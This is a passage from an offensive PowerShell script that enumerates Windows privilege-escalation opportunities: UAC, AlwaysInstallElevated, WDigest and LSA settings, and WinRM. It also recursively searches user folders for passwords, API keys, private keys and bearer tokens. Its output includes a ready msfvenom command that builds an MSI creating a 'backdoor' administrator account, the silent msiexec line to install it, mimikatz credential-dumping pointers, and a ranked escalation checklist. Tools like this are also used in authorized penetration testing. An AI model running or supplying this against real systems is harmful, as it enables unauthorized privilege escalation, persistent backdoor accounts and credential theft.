        Write-Finding "UAC is effectively DISABLED - all bypass methods will work"
    }
}

# AlwaysInstallElevated
Write-Host ""
Write-Host "  AlwaysInstallElevated (the holy grail):" -ForegroundColor White
$hkcuPolicy = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
$hklmPolicy = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
$hkcuFlag = (Get-ItemProperty $hkcuPolicy -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hklmFlag = (Get-ItemProperty $hklmPolicy -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated

if ($hkcuFlag -eq 1 -and $hklmFlag -eq 1) {
    Write-Finding "AlwaysInstallElevated = 1 on BOTH HKCU and HKLM!"
    Write-Finding "Generate MSI payload: msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi > evil.msi"
    Write-Finding "Then run: msiexec /quiet /qn /i evil.msi"
} else {
    Write-Info "AlwaysInstallElevated not set on both (HKCU=$hkcuFlag, HKLM=$hklmFlag)"
}

# LSA Protection (Credential Guard / LSA as protected process)
Write-Host ""
Write-Host "  RunAsPPL (LSA Protection):" -ForegroundColor White
$lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
if (Test-Path $lsaPath) {
    $runAsPPL = (Get-ItemProperty $lsaPath -Name "RunAsPPL" -ErrorAction SilentlyContinue).RunAsPPL
    $dsrlonly = (Get-ItemProperty $lsaPath -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue).DsrmAdminLogonBehavior
    Write-Host "    RunAsPPL: $runAsPPL" -ForegroundColor White
    Write-Host "    DsrmAdminLogonBehavior: $dsrlonly" -ForegroundColor White
}

# WinRMS (remote management) status
Write-Host ""
Write-Host "  WinRM Configuration:" -ForegroundColor White
try {
    $winrm = Get-WmiObject -Class Win32_Service -Filter "Name='WinRM'"
    Write-Host "    WinRM Service: $($winrm.State)" -ForegroundColor White
    if ($winrm.State -eq "Running") {
        Write-Info "Run remote commands: Invoke-Command -ComputerName <host> -ScriptBlock { <cmd> }"
    }
} catch {}

# SeRestore / LAPS / LSA settings summary
Write-Host ""
Write-Host "  Local Account Password Solution (LAPS):" -ForegroundColor White
$lapsPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History"
if (Test-Path $lapsPath) {
    Write-Info "LAPS-related policies detected"
}

# Computer description (sometimes contains hints)
$csDesc = (Get-WmiObject -Class Win32_OperatingSystem).Description
if ($csDesc) {
    Write-Host ""
    Write-Host "  Computer Description:" -ForegroundColor White
    Write-Host "    $csDesc" -ForegroundColor Gray
}

#==============================================================================
# 11. INTERESTING FILES (DEEP SEARCH)
#==============================================================================
# Why: Often scripts left behind by sysadmins contain plaintext creds, or
# tools like Rclone, WinSCP, etc. with auth tokens.

Write-Banner "11. DEEP FILE SEARCH"

# Search specific interesting patterns in user-owned files (perf-bounded)
Write-Host "  Searching for credential-like patterns in user files (this is slow)..." -ForegroundColor White

$searchDirs = @("C:\Users")
$searchPatterns = @{
    "password = " = "*.ps1", "*.bat", "*.cmd", "*.txt", "*.cfg", "*.ini", "*.config"
    "api_key"      = "*.ps1", "*.py", "*.json", "*.env"
    "BEGIN PRIVATE KEY" = "*.pem", "*.key"
    "AWS_ACCESS_KEY" = "*.txt", "*.env", "*.config"
    "Authorization: Bearer" = "*.ps1", "*.txt", "*.log"
}

# Bounded by file count for performance
$maxFilesPerPattern = 1000
$fileCount = 0

foreach ($pattern in $searchPatterns.GetEnumerator()) {
    Write-Host "    Pattern: $($pattern.Key)..." -ForegroundColor Gray -NoNewline
    $matches = 0
    foreach ($dir in $searchDirs) {
        foreach ($ext in $pattern.Value) {
            try {
                Get-ChildItem -Path $dir -Recurse -Filter $ext -ErrorAction SilentlyContinue -Force -Depth 6 |
                    Select-Object -First ($maxFilesPerPattern - $fileCount) |
                    ForEach-Object {
                        $fileCount++
                        try {
                            $content = Get-Content $_.FullName -ErrorAction SilentlyContinue -Raw
                            if ($content -and $content -match [regex]::Escape($pattern.Key)) {
                                Write-Finding "File with '$($pattern.Key)': $($_.FullName)"
                                $matches++
                            }
                        } catch {}
                    }
            } catch {}
            if ($fileCount -ge $maxFilesPerPattern) { break }
        }
        if ($fileCount -ge $maxFilesPerPattern) { break }
    }
    Write-Host " ($matches found)" -ForegroundColor Gray
    if ($fileCount -ge $maxFilesPerPattern) { break }
}

#==============================================================================
# 12. IN-MEMORY SECRETS (Stealth-light, requires admin / mimikatz-like)
#==============================================================================
# Why: Wdigest cached creds (if WDigest creds are cached), LSA secrets in
# memory. We won't ship Mimikatz in here (binary download is sketchy from
# random scripts), but we'll check the WDigest registry flag + tell you
# how to check LSA.

Write-Banner "12. IN-MEMORY PROTECTIONS CHECK"

$useLogonCredsPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest"
if (Test-Path $useLogonCredsPath) {
    $digest = (Get-ItemProperty $useLogonCredsPath -Name "UseLogonCredential" -ErrorAction SilentlyContinue).UseLogonCredential
    if ($digest -eq 1) {
        Write-Finding "WDigest UseLogonCredential = 1 -> cleartext creds cached in LSASS!"
        Write-Info "Mimikatz can recover: sekurlsa::wdigest"
    } else {
        Write-Info "WDigest is disabled (UseLogonCredential=$digest) - no cleartext cache"
    }
}

# LSA runas protection
Write-Host ""
Write-Host "  LSA Protection:" -ForegroundColor White
Write-Info "Run 'mimikatz.exe' or SharpHound/BloodHound-style tools separately if admin"
Write-Info "Quick LSA secrets check requires admin + tools beyond pure PowerShell"

#==============================================================================
# 13. SUMMARY OF FINDINGS
#==============================================================================
Write-Banner "SUMMARY - PRIORITY ESCALATION CHECKLIST"

Write-Host ""
Write-Host "  Re-review the [RED] findings above. Top vectors to investigate:" -ForegroundColor White
Write-Host ""
Write-Host "    1. SeImpersonate / SeBackup / SeRestore / SeDebug enabled -> Potato attacks" -ForegroundColor White
Write-Host "    2. AlwaysInstallElevated -> quick MSI elevation" -ForegroundColor White
Write-Host "    3. Unquoted service paths + writable install dir -> service hijack" -ForegroundColor White
Write-Host "    4. Saved credentials (cmdkey, WiFi, Group Policy Preferences)" -ForegroundColor White
Write-Host "    5. WDigest cleartext creds -> Mimikatz from your workstation" -ForegroundColor White
Write-Host "    6. Stored AutoLogon / cpassword / unattend.xml plaintext" -ForegroundColor White
Write-Host "    7. World-writable PATH directories -> DLL hijack" -ForegroundColor White
Write-Host "    8. Service DLL hijack (search writable service binary dirs)" -ForegroundColor White
Write-Host "    9. Third-party software with known CVEs (FileZilla, WinSCP, etc.)" -ForegroundColor White
Write-Host "   10. Group Policy Preferences cpassword decryption (free Win admin)" -ForegroundColor White
Write-Host ""
Write-Host "  Next manual steps:" -ForegroundColor White
Write-Host "    * Run accesschk.exe /accepteula for ACL audits of service dirs" -ForegroundColor White
Write-Host "    * Run icacls on suspicious directories" -ForegroundColor White
Write-Host "    * Test cpassword decryption with gpp-decrypt" -ForegroundColor White
Write-Host "    * Check task scheduler XML files for inline credentials" -ForegroundColor White
Write-Host ""

Write-Banner "REPORTS SAVED"
Write-Host "  All detailed reports saved to: $OutputDir"
Write-Host ""
Get-ChildItem $OutputDir | ForEach-Object {
    $size = "{0:N1}KB" -f ($_.Length / 1KB)
    Write-Host "    $($_.Name.PadRight(30)) $size" -ForegroundColor White
}
Write-Host ""

Write-Banner "DONE"
Write-Host "  Finished at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Green
Write-Host ""
